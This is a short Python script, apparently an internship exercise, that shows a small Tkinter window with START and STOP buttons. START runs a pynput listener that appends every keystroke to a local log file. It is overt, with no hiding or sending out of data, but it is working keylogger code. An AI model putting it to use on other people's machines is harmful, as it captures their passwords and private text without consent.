import threading
from tkinter import *
from pynput.keyboard import Listener

def write_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == "Key.ctrl_l":
        letter = ""
    elif letter == "Key.enter":
        letter = "\n"
    elif "Key." in letter:
        letter = " "
    with open(r"C:\Users\sanja\Desktop\internship\keylogger\log.txt", "a", encoding="utf-8") as f:
        f.write(letter)

def start():
    t = threading.Thread(target=run_listener, daemon=True)
    t.start()

def run_listener():
    with Listener(on_press=write_file) as l:
        l.join()

def stop():
    windows.destroy()

windows = Tk()
windows.title("KEYLOGGER")
windows.geometry("200x150")
windows.config(bg="#77F8FF")

frame = Frame(windows, bg="#fff7ae", highlightbackground="gray", relief="solid", bd=2)
frame.pack(padx=10, pady=10,expand=True)

start_button = Button(frame,text="START",command=start)
start_button.pack(padx=10,pady=10,side="top",expand=True)

stop_button = Button(frame,text="STOP",command=stop)
stop_button.pack(padx=20,pady=10,side="top",expand=True)


windows.mainloop()